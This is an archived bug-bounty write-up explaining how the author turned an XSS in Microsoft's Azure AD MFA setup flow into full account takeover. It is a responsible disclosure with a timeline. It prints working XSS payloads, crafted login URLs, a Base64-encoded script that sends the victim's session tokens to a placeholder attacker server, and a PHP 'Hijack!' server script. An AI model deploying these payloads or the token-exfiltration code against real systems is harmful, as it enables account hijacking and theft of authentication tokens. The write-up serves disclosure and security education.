# Escalating Impact

- **Source URL:** https://melotover.medium.com/escalating-impact-full-account-takeover-in-microsoft-via-xss-in-login-flow-f160fa79b008?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260725192643/https://melotover.medium.com/escalating-impact-full-account-takeover-in-microsoft-via-xss-in-login-flow-f160fa79b008
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9412 (id 9412)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Escalating Impact: Full Account Takeover in Microsoft via XSS in Login Flow

Microsoft’s login system featured a **highly secure and complex architecture**, built with multiple layers of protection that made analysis particularly challenging.

In this article, I’ll take you through the **full details** of how I discovered and exploited a **full account takeover vulnerability** using **Cross-Site Scripting (XSS) during login** — a flaw hidden within Microsoft’s authentication flow that could have allowed attackers to gain **complete control** over user account.

In addition, I’ll break down key components of Microsoft’s login mechanism to clarify the concepts I’ll discuss. This will help you understand the system and assist if you plan to hunt on Microsoft yourself!

## Understanding Microsoft’s Login Mechanism and Azure Active Directory (Azure AD):

Microsoft’s authentication relies on **Azure Active Directory (Azure AD)**, a cloud-based identity and access management system used across services like Microsoft 365. A fundamental concept in Azure AD is **tenants**, which define organizational boundaries in Microsoft’s ecosystem.

### What Are Tenants in Azure AD?

A **tenant** in Azure AD is a dedicated instance of the service that belongs to a specific organization. Think of it as a secure container for users, groups, applications, and policies. The following are key characteristics of tenants:

- Each organization using Microsoft services (e.g., Microsoft 365) is assigned its own tenant, which is completely isolated from others. This ensures data security and integrity across different tenants and organizations.
- A tenant is tied to a unique domain, such as `{organizationName}.onmicrosoft.com` .
- Each tenant is assigned a unique identifier, called the **Tenant ID**, which is represented as a UUID (e.g., `e1234567-89ab-cdef-0123-456789abcdef`).

### Types of Tenants and How it Differs when it Comes to login:

When you login to your account, the way Microsoft handles it can vary depending on the type of account you’re using. **Why?**

Because **Azure AD supports different types of tenants**, each designed to cater to specific use cases:

**Type 1: Work or School Accounts (Azure AD Tenant)**:

- Used by organizations for managing employee/student access to enterprise applications, and as we mentioned above, each Azure AD tenant has a unique **Tenant ID** (a UUID) that identifies it.
- Authentication Endpoint: 
`https://login.microsoftonline.com/`**{tenant-id}**/oauth2/v2.0/authorize
- This Tenant ID must be inserted in place of **{tenant-id}**

**Type 2: Personal Accounts (Microsoft Account Tenant)**:

- Designed for individual users accessing services like Outlook.com, Xbox Live, or OneDrive.
- **Personal accounts are not associated with any specific tenant.** Instead, they use Microsoft’s **consumer identity service**. As a result, **Tenant UUIDs are not required**, since there’s no multi-tenant context to resolve, as all personal accounts are in the same “global” namespace.
- **Authentication handled separately**, using `https://login.live.com/oauth20_authorize.srf` instead of `https://login.microsoftonline.com` used by work/school accounts in type 1.

Since this write-up focuses on **Work or School Accounts (Type 1)**, we’ll explore how Microsoft’s login process identifies and verifies users within these environments, I’ll keep it simple as I can.

### Work or School Accounts Login Mechanism and Tenant Identification:

Azure AD’s authentication process is tightly linked to **tenant identification**, ensuring users authenticate within the correct organizational boundary. Here’s how it works:

1. The user navigates to the login URL:
`https://login.microsoftonline.com/`**{tenant-id}**/oauth2/v2.0/authorize
,
replacing**{tenant-id}**
**tenant UUID**. Once there, they enter their credentials (such as email and password) to begin the authentication process.
2. The system primarily identifies the tenant using **{tenant-id}**
*(However, there’s another method — I’ll cover it later).*
3. Azure AD checks tenant-specific policies like **Multi-Factor Authentication (MFA)**. *(Pay close attention to this part)*
4. Upon successful authentication, Azure AD issues a token, validates it, and uses the **Tenant UUID** to ensure the token is valid for the **specific tenant.**

With this foundational understanding, let’s dive into how I leveraged an XSS vulnerability within this flow to achieve a full account takeover.

## Now We Begin:

For **Work or School Accounts**, users don’t create their own accounts; organizations (e.g., companies, schools, universities) provision them. Users then receive their credentials and complete the initial setup, including **Multi-Factor Authentication (MFA)**, before gaining access.

After reviewing Microsoft’s documentation and login flow, I began testing strategically — from the ground up. Using a fresh account **with the minimal possible security protections that can be applied to any account** and attempting to bypass them while paying close attention to every detail.

Although MFA was enforced, I initially set it up, then navigated to security settings and removed all additional protections — **leaving only the password as the sole authentication method**.

Then I tried to login again with a different browser, and as I said above, the **application will redirect a couple of times and force you to set up a 2FA layer** like “Authenticator app”.

One of the redirections that caught my attention is a redirect to a legacy domain associated with Azure AD, called `account.activedirectory.windowsazure.com`, and this is primarily used to configure MFA settings, manage security keys, and update authentication methods like **phone numbers and authenticator apps.**

In this redirect, a POST request was sent to `/proofup.aspx` endpoint, with three POST parameters:

- `flowtoken`: A token representing the state of the current authentication flow, **it ensures that users cannot bypass intermediate steps by jumping directly to a later step**.
- `request`: Passed between authentication endpoints to retain context about the original request (e.g., scopes, redirect URIs, app IDs). It helps Azure AD validate a request if additional checks (like MFA) are triggered.
- `canary`: A security-related token or identifier used to protect against **replay attacks** or **tampering** during the authentication process. Think of it as part of CSRF protection.
- `pru`: The app that validates the MFA.

Also note that:

- All these parameters are generated by the application after login.
- Most **accounts with only the password as the sign-in method** would be redirected to this specific domain.

The response contained an auto-submitted form that worked as a POST redirect to another endpoint `/securityinfo` with 2 main parameters:

- `PostRedirectArguments`: A collection of all parameters included in the request. (e.g. `flowtoken`, `request`, etc)
- `PESTS`: A generated **state token** used internally by Microsoft’s authentication flow to track the user’s session and context. **The server generates it based on the parameters sent with the request we mentioned earlier** (e.g. `flowtoken`, `request`, etc). This means that if the request parameters belong to you, the generated token also belongs to you. This is an important point to keep in mind.

**PESTS** token is highly sensitive — think of it as the **backbone of the entire authentication process**. In fact, `/securityinfo` endpoint relies on these two parameters to **identify the user within the MFA system**, **linking it directly to the authenticated user**. That’s what makes it so crucial.

What caught my eye is **the auto-submitted form in the response**, its `action` attribute has many **undefined parameters**, I tried to use some of them as a GET and POST parameter in the request, but there was no reflection.

I decided to focus on this particular endpoint, as the presence of empty parameters hinted that **they might be expecting input**. To explore this further, I expanded my search scope by leveraging Google, the Wayback Machine, and, of course, my Burp Suite history.

I found parameters with similar names can be passed to this endpoint like `X-client-Ver` and `x-client-SKU` parameters that will be reflected in `brkrVer` and `clientSku` in the form respectively.

I tried to break the single quote to get out of the form’s `action` attribute, and it worked fine.

I couldn’t break the entire form by adding a closing tag `>` because it was encoded and I was limited to using some special characters as well. Additionally, since the form was auto-submitted, you’re very limited in using event handlers or running JavaScript, especially after the action attribute.

You might consider adding a new `action` attribute with inline JavaScript, as shown below, **it would simply be ignored**.

`8.0.1'injected='meloz'action='javascript:alert(1);'test='````
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms["registrationForm"].submit();'>
    <form action='https://served.from.server/endpoint' injected='meloz'
          action='javascript:alert(1);'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
```
There are several ways to deal with this situation. I’ll outline a few and explain exactly why I chose the one I did. Just to remember: this is a POST request, so if somehow I manage to find an XSS vulnerability, **I’ll need to deliver it to the victim through a CSRF-based form**.

### Choosing the Right Exploitation (Round 1):

Here’s why I mentioned being ***very limited*** — in this scenario, I need an event handler that meets **all three** of the following constraints:

1. It must be compatible with the `<form>` element.
2. It must execute **even when the form is auto-submitted**.
3. It must trigger **without requiring any user interaction**.

In form tags, we can use a couple of event handlers that rely on some styles like the new one `oncontentvisibilityautostatechange` as below:

`8.0.1'injected='meloz'oncontentvisibilityautostatechange='alert(1)'style='content-visibility:auto'test='````
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms["registrationForm"].submit();'>
    <form action='https://served.from.server/endpoint' injected='meloz'
          oncontentvisibilityautostatechange='alert(1)'
          style='content-visibility:auto'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
```
However, it doesn’t work in all browsers (older versions/some mobile browsers/bad handled in Firefox), and if there is a real bug, I want it to affect as many users and browsers as possible to maximize our attack surface and avoid arguing with the triagers.

**So, I need to change my approach. Let’s break down two key concepts:**

1. **URL Fragments**: These are the part of a URL after the `#` symbol, used to link to specific sections of a webpage by referencing the `id` of an element. When a URL with a fragment is loaded, the browser will attempt to focus on the element (**if it’s focusable by default**).
But what if the element isn’t focusable by default, like our`form` tags? I’ll address that shortly.
2. **The** **tabindex**
 **Attribute**: This controls the order in which elements receive focus when navigating with the Tab key on the keyboard.

- **If** **tabindex="1"**
 **or higher**: The element becomes **focusable** and takes priority in the tab order.
- **If** **tabindex="-1"**

By combining these two concepts, we can force the `form` tag to be focusable using `tabindex`, and then use the `onfocus` event handler to execute JavaScript along with the **URL fragment** triggering the focus.

`'injected='meloz'onfocus='alert(1)'tabindex='1'test='````
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms["registrationForm"].submit();'>
    <form action='https://served.from.server/endpoint' injected='meloz'
          onfocus='alert(1)' tabindex='1'
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
```
To exploit this, an attacker could deliver a link to the victim with the `id` of the form as a URI fragment, like so:

`https://account.activedirectory.windowsazure.com/proofup.aspx?X-client-Ver=8.0.1'injected='meloz'onfocus='alert(1)'tabindex='1'test='#registrationForm`
Now let’s try to create the CSRF form that will be hosted on our server:

```
<html>
    <form id="csrfPOC" action="https://account.activedirectory.windowsazure.com/proofup.aspx?X-clinet-Ver=8.0.1'injected='meloz'onfocus='alert(1)'tabindex='1'test='#registrationForm" method="POST">
      <input type="hidden" name="flowtoken" value="{FLOWTOKEN}" />
      <input type="hidden" name="pru" value="{PRU}" />
      <input type="hidden" name="request" value="{REQUEST}" />
      <input type="hidden" name="canary" value="{CANARY}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms["csrfPOC"].submit();
    </script>
</html>
```
Tried in a different browser, and I got `400 Bad Request`!

I was confused! I double-checked for any custom headers or anything I might have missed, only to realize that one of the tokens/values in the POST body had expired.

I tried again with a fresh token and it works like a charm.

A valid token remains usable for nearly 20–30 minutes, which presents a clear obstacle! I could report it now, but I asked myself: I**s there a real impact here?**

- 95% of the cookies have a **HttpOnly** flag, making them inaccessible to JavaScript.
- What about stealing `localStorage`/`sessionStorage` content?
There’s almost nothing to grab.
- Maybe we could try stealing the **PESTS**
**your token**, not the victim’s. The application generates it based on the parameters you send, meaning it typically belongs to you — not the victim. Instead of attacking users, you’re just leaking your own. Genius move!
- Do we have the victim’s token? Nope. Steal it? Not a chance. Can we do anything impactful beyond the victim? Big fat NO.

All signs lead to one conclusion — it’s not enough! Time to take a step back and make sure I’m not overlooking something bigger.

### Taking a step back!

I spent extra time reviewing the Burp Suite history until I spotted something **that changed the entire game**!

Take a closer look at the above response — do you see what I see? In a seemingly random request, the same parameters are being **appended to the main login URL**!

This got me thinking — Does Microsoft’s login system store these parameters and pass them along to the vulnerable endpoint `https://account.activedirectory.windowsazure.com/proofup.aspx` when 2FA is disabled? If that’s the case, then we’re onto something big. That would mean we can inject externally — no need for time-sensitive valid values, and no more dealing with POST CSRF!

Exactly! I injected our payload at the end of the `x-client-ver` parameter, as shown below:

`https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=&ui_locales=en-US&mkt=en-US&client-request-id=ce8a562b-79d9-4150-8f97-f1a7b18b78e4&state=&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0'injected='meloz'onfocus='alert(1)'tabindex='1'test='`
This results in the following redirect:

`https://account.activedirectory.windowsazure.com/proofup.aspx?x-client-Ver=7.5.1.0%27injected%3d%27meloz%27onfocus%3d%27alert(1)%27tabindex%3d%271%27test%3d%27&x-client-SKU=ID_NET8_0&culture=en-US`
This is exactly what we want. But unfortunately, no alert popped up! This was expected since we didn’t include the URL fragment (the `id` of the form `#registrationForm`).

Because the login URL redirects to a different origin, even if we add the URL fragment, **the browser won’t pass it along during the redirect**. This means we need to find an alternative way to trigger the `focus()` function on the form.

I know what you thinking, `autofocus` attribute is the one, right? let’s try it.

`'injected='meloz'onfocus='alert(1)'autofocus=''tabindex='1'test='````
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms["registrationForm"].submit();'>
    <form action='https://served.from.server/path?brkrVer=8.0.1'
          injected='meloz' onfocus='alert(1)' autofocus='' tabindex='1' 
          test='/theRest/Of/TheEndpoint' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
```
When I tried it in Chrome, it worked fine, but it **didn’t work in Firefox**, maybe Firefox is more cautious when it comes to automatic form submissions or form submissions without user interaction. It could be blocking the `onfocus` event from triggering an alert when a form is automatically submitted — **remember this sentence, we will need it later on**.

As I mentioned earlier, the more users we impact, the larger the attack surface grows. So once again, we need to step back and ensure our payload works across all browsers to maximize the number of users that could be affected by this vulnerability.

### Choosing the Right Exploitation (Round 2):

In Firefox, the issue lies in the **form’s auto-submission**. While analyzing the form, I noticed that our injection occurs **before** the `id` and `name` attributes.

So, why not add a **new id and** **name**`document.forms["registrationForm"]`?

Take the example below — if we injected the following:

`'injected='meloz' id='melotover' name='melotover````
<html>
  <body onload='document.forms["registrationForm"].submit();'>
    <form action='https://served.from.server/path?brkrVer=8.0.1'
          injected='meloz' id='melotover' name='melotover' method='POST' id='registrationForm'
          name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
```
What happens when we call`document.forms["registrationForm"].submit();`?

The result: `document.forms["registrationForm"]` becomes **undefined**, preventing the `form` from submitting automatically. Now, if we do it in our target as below, our script executes as intended in almost all browsers!

`'id='melotover'name='melotover'tabindex='1'onfocus='alert(document.domain)'autofocus=''test='````
<!-- Reflection in POST request -->
<html>
  <body onload='document.forms["registrationForm"].submit();'>
    <form action='https://served.from.server/path?brkrVer=8.0.1'
          id='melotover' name='melotover' tabindex='1'
          onfocus='alert(document.domain)' autofocus=''
          test='/theRest/Of/TheEndpoint' method='POST'
          id='registrationForm' name='registrationForm' target='_self' >
      <input type='submit'>
    </form>
  </body>
</html>
```
Fine, let’s say we want to attack an organization called `RealCompany`, if we somehow find their `{`,**tenant-id}** we can pass this vulnerable URL to the users working there:

`https://login.microsoftonline.com/{tenant-id}/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=&x-client-SKU=ID_NET8_0&x-client-ver=80.0.1'id='melotover'name='melotover'tabindex='1'onfocus='alert(document.domain)'autofocus=''test='`
`{tenant-id}` is a UUID-formatted value that is difficult to guess. However, you can find plenty of them through Google, the Web Archive, and other sources. **Moreover**, Instead of being stuck with UUIDs, you can also use the domain provided by Microsoft (`{organizationName}.onmicrosoft.com`) as we discussed earlier. Seems to be a little bit easier to find the domain.

Ideally, we want to expand this attack beyond just tenant-wide or organization-wide, **enabling our vulnerable URL to target ANY user in ANY organization.**

One key detail I found in Microsoft’s training materials is that **several predefined tenant identifiers can be used in place of** `/{tenant-id}/`, including:

- `/common/` → Any Microsoft account (personal or work/school)
- `/organizations/` → Only work/school accounts (Azure AD)
- `/consumers/` → Only personal Microsoft accounts (e.g., Outlook)
- `/{tenant_id}/` → A specific Azure AD tenant (by its ID or domain)

We can use `/common/`, right? But you may ask, How does the login system determine the correct tenant in this case? When a user logs in via `https://login.microsoftonline.com/common/oauth2/authorize`, Azure AD **extracts the domain from their email** (e.g., `melo@realcompany.com`) to identify the corresponding tenant.

If the domain is linked to an Azure AD tenant, the system automatically redirects the user to that tenant’s specific login page.

So simply, we can confirm the final payload that just verifies the **XSS vulnerability** (pops up an alert box) as follows:

`https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fm365.cloud.microsoft%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=&x-client-SKU=ID_NET8_0&x-client-ver=80.0.1'id='melotover'name='melotover'tabindex='1'onfocus='alert(document.domain)'autofocus=''test='`
For now, rather than limiting our XSS payload to a 30-minute window and specific organizations, we have an **unrestricted**, **organization-wide** exploit that **impacts all users**. But it’s still just an XSS, and we need to find a way to leverage its impact.

## Escalating the Impact:

Given how sensitive the `PESTS` parameter is—**playing a key role in identifying users within the MFA system**—I wondered if stealing and reusing it could lead to something impactful.

To test this, I attempted to login with a different account. When it came time to use my `PESTS` value, I replaced it with another user's (let’s call them **User2**) to observe the application's behavior. The result? An error occurred.

Next, and instead of replacing only `PESTS`, I replaced all parameters sent to `/securityinfo` with **User2**'s values. This time, instead of throwing an error, the application redirected me to the MFA setup page, **allowing me to add a new authentication method as User2!**

Incredible.

Now, let’s start exploiting it.

The easiest way to capture all these parameters is by changing the form’s `action` to a file on our server that handles incoming POST requests. This approach not only ensures that all parameters are sent to our server but also interrupts the login process, keeping the tokens valid.

But due to some encoding issues, I’ll take a similar way, with the help of javascript, I will select all `<input>` tags in the page, encode it, and send it to my server.

Let me break down the exploit sequence for you so you don’t get lost:

- The user visits our crafted vulnerable link. After logging in, they are redirected to the actual vulnerable page (`/proofup.aspx`), where our payload executes.
- Our payload collects all `<input>` tags containing sensitive tokens, encodes them, and transmits them to our server—along with **a unique identifier for the specific user**.
- Our server decodes the received parameters, reconstructs a form identical to the one on the vulnerable page, and saves it as a file. The filename matches the unique identifier we created earlier.
- By visiting this file, we get redirected to the victim’s account, where we can add a new MFA method.
- We register our own authentication method. The application now recognizes us as the authorized user and redirects us to the account settings page.
- At this point, **we have full control over the victim’s account.**
- Mission accomplished!

Our payload:

```
content = btoa(document.forms[0].innerHTML);
f = document.createElement("form");
f.method = "post";
f.action = "https://{YOUR_SERVER}/POC.php?userID=".concat(Date.now());
i = document.createElement('input');
i.name = "data";
i.value = content;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```
Due to input validation restrictions, I encoded the payload in Base64 and injected it into the `rel` attribute of the form, then triggered it through the `onfocus` event handler using `eval()`.

`'id='melotover'name='melotover'rel='Y29udGVudD1idG9hKGRvY3VtZW50LmZvcm1zWzBdLmlubmVySFRNTCk7Zj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7Zi5tZXRob2Q9InBvc3QiO2YuYWN0aW9uPSJodHRwczovL3tZT1VSX1NFUlZFUn0vUE9DLnBocD91c2VySUQ9Ii5jb25jYXQoRGF0ZS5ub3coKSk7aT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpO2kubmFtZT0iZGF0YSI7aS52YWx1ZT1jb250ZW50O2YuYXBwZW5kQ2hpbGQoaSk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTtmLnN1Ym1pdCgpOw=='tabindex='1'autofocus=''onfocus='eval(atob(this.rel));//`
Finally, the ultimate vulnerable URL:

`https://login.microsoftonline.com/common/oauth2/authorize?client_id=0000000c-0000-0000-c000-000000000000&redirect_uri=https%3A%2F%2Faccount.activedirectory.windowsazure.com%2F&response_mode=form_post&response_type=code%20id_token&scope=openid%20profile&state=OpenIdConnect.AuthenticationProperties%&nonce=1736410058.168t6DgXvBr4QMXh3SLAeg&amr_values=ngcmfa&nux=1&x-client-SKU=ID_NET472&x-client-ver=8.0.1.0%27id=%27melotover%27name=%27melotover%27rel=%27Y29udGVudD1idG9hKGRvY3VtZW50LmZvcm1zWzBdLmlubmVySFRNTCk7Zj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJmb3JtIik7Zi5tZXRob2Q9InBvc3QiO2YuYWN0aW9uPSJodHRwczovL3tZT1VSX1NFUlZFUn0vUE9DLnBocD91c2VySUQ9Ii5jb25jYXQoRGF0ZS5ub3coKSk7aT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpO2kubmFtZT0iZGF0YSI7aS52YWx1ZT1jb250ZW50O2YuYXBwZW5kQ2hpbGQoaSk7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTtmLnN1Ym1pdCgpOw==%27tabindex=%271%27autofocus=%27%27onfocus=%27eval(atob(this.rel));//`
And here’s the server-side script that takes care of the hijacking!

```
<?php
if (isset($_GET['userID'])
  && !empty($_GET['userID'])
  && ctype_digit($_GET['userID'])) {
     $filename = "user_" . $_GET['userID'];
}else{
  die("Error");
}
if ($_SERVER['REQUEST_METHOD'] === "POST") {
 $data = file_get_contents("php://input");
 !empty($data) && file_put_contents($filename, $data);
 echo "good luck!";
}else{
 $fileContent = file_get_contents($filename);
 if (preg_match('/data=([A-Za-z0-9+\/=]+)/', $fileContent, $matches)) {
     $decodedValue = base64_decode($matches[1]);
     echo "
       <!DOCTYPE html>
       <html lang='en'>
       <head>
           <meta charset='UTF-8'>
           <title>Dashboard</title>
       </head>
       <body>
       <div style='text-align:center'>
           <form id='hijack'
            action='https://account.activedirectory.windowsazure.com/securityinfo?isOobe=False&brkr=&brkrVer=8.0.1.0&clientSku=ID_NET472&personality=&authMethods=&authMethodCount='
            method='POST'>
               " . $decodedValue . "
           </form>
           <button onclick='document.forms.hijack.submit();' type='submit'>Hijack!</button>
          </div>
       </body>
       </html>";
 }}
?>
```
I’ve cracked it — now it’s time to send the report to Microsoft!

I know that reading about the exploit is one thing, but seeing it in action is a whole different experience — so I’m releasing a POC video for you to check out:

## The day after submitting the report:

I revisited the exploit with a bigger goal in mind — not just targeting users relying solely on passwords for sign-in, **but every single user!**

My mission? **Make it application-wide**!

I experimented with the application by intentionally triggering errors and observing some unusual behavior, and I got some.

When a valid request is sent to the vulnerable endpoint `/proofup.aspx`, the application **caches the response** by setting a **cookie that stores the generated PESTS value**. This cached response remains valid for approximately **80 minutes**—the same duration as the cookie's validity.

When the page got cached, even when sending a simple **GET request** to `https://account.activedirectory.windowsazure.com/proofup.aspx`, the application still returns the same cached response.

## Why This Matters?

This means that if I send a valid request containing an **XSS payload**, the XSS will execute. Moreover, since the application caches the entire response, any subsequent requests (**GET or POST**, **regardless of an expired body or not**) will **still execute the XSS payload**.

## General Exploit Flow

1. A **CSRF attack** is crafted with a valid form containing my **tokens** and the **XSS payload**.
2. The application processes the request, responds with my **PESTS**
**caches the entire response** in a cookie.
3. A victim (who has **2FA enabled**) forced to log in and is forcefully redirected to `https://account.activedirectory.windowsazure.com/proofup.aspx`.
4. Since the cached response is returned, the XSS executes again — **but this time, it runs in the context of the victim’s authenticated session, not mine.**

This presents a challenge — how do you submit a form that triggers top-level navigation while also redirecting the user to the login URL?

I came up with a simple trick — when we submit the form to `/proofup.aspx` with our XSS payload, it executes as expected, right? So why not add a simple line to our payload to redirect the user to the login page? This might create a loop, but here's the catch: the first time the script runs, the user isn’t logged in; the second time, they are!

I mentioned this note in my reply to the MSRC team for their consideration.

### Report Timeline:

**11 Jan 2025:** Reported the vulnerability to the MSRC team.

**12 Jan 2025:** Provided additional notes and POCs.

**14 Jan 2025:** MSRC team acknowledged the report and opened a case.

**05 Feb 2025:** MSRC team confirmed the case, implemented a fix, and began reviewing for a bounty.

**06 Feb 2025:** Bounty awarded.

That’s it! I hope you enjoyed reading. If you have any feedback or thoughts, feel free to [share with me](https://x.com/Melotover).
